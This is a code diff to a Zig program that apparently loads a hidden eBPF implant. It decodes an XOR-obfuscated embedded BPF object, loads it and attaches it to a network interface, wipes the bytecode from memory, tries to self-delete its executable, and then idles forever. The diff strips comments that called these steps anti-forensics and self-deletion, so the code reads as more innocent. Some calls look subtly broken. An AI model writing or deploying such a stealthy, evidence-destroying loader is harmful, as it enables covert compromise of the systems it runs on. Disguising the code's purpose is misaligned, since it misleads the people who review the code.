@@ -1,11 +1,12 @@
 const std = @import("std");
 const sc = @import("syscalls.zig");
 
-// Exporting _start with C calling convention for the linker
-export fn _start() callconv(.C) noreturn {
+// 'export' makes this symbol visible to the linker and uses C ABI by default.
+// Using 'noreturn' is critical for freestanding entry points.
+export fn _start() noreturn {
     var bpf_blob = @constCast(@embedFile("../target/ghost.o").*);
     
-    // De-obfuscate BPF bytecode in memory
+    // De-obfuscate BPF bytecode
     inline for (0..bpf_blob.len) |idx| { bpf_blob[idx] ^= 0x7A; }
 
     const meta = parse_elf(bpf_blob);
@@ -15,7 +16,7 @@ export fn _start() callconv(.C) noreturn {
 
     const iface = find_iface();
     
-    // Industrial standard: anonymous mmap for stack isolation
+    // Anonymous mmap for a clean execution stack
     const stack = sc.mmap(0, 65536, 3, 0x22, -1, 0);
     if (sc.clone(0x00000100 | 17, stack + 65536) != 0) sc.exit(0);
 
@@ -39,7 +40,6 @@ export fn _start() callconv(.C) noreturn {
         .fd = @intCast(map_fd) 
     }, 16);
 
-    // Wipe bytecode from memory after loading (Anti-Forensics)
     @memset(bpf_blob, 0);
 
     _ = sc.bpf_syscall(28, &sc.bpf_attr_link{ 
@@ -48,7 +48,6 @@ export fn _start() callconv(.C) noreturn {
         .attach_type = 37 
     }, 64);
 
-    // Self-delete artifact from procfs
     _ = sc.unlink("/proc/self/exe");
     
     while (true) { _ = sc.nanosleep(3600); }
